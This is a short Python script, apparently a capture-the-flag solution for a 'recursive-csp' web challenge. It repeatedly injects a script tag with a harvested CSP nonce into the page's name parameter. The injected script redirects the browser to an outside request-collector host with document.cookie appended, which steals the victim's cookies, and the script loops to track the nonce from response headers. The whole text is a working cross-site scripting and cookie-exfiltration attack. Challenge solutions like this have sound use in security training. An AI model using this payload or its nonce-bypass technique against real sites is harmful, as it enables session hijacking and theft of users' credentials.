import requests

nonce = ['87e8e432']
for i in range(1000):
    url = 'https://recursive-csp.mc.ax/?name='
    param = '<script nonce='+ nonce[i] +'>window.location="https://ppdusae.request.dreamhack.games?"+document.cookie;</script>'
    r = requests.get(url=url+param)
    str1 = str(r.headers).split('nonce-')
    nonce.append(str1[1][0:8])
    if nonce[i] == nonce[i-1]:
        print("\n\n\n\n\n",nonce)
        break
    print(nonce[i])


